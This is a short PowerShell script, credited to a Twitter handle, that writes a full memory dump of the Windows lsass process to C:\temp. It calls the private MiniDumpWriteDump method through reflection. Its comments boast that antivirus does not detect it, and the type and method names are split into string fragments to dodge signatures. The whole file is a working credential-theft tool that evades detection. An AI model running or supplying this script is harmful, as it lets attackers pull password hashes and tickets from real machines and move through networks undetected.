#Twitter: @TihanyiNorbert (No AV detecetion 2022 March)
#Full-memory lsass dump based on the original work of Matthew Graeber (@mattifestation)

$S = "C:\temp"
$P = (Get-Process lsass)
$A = [PSObject].Assembly.GetType('Syst'+'em.Manage'+'ment.Autom'+'ation.Windo'+'wsErrorRe'+'porting')
$B = $A.GetNestedType('Nativ'+'eMethods', 'Non'+'Public')
$C = [Reflection.BindingFlags] 'NonPublic, Static'
$D = $B.GetMethod('MiniDum'+'pWriteDump', $C) 
$PF = "$($P.Name)_$($P.Id).dmp"
$PDP = Join-Path $S $PF
$F = New-Object IO.FileStream($PDP, [IO.FileMode]::Create)
$R = $D.Invoke($null, @($P.Handle,$G,$F.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
$F.Close()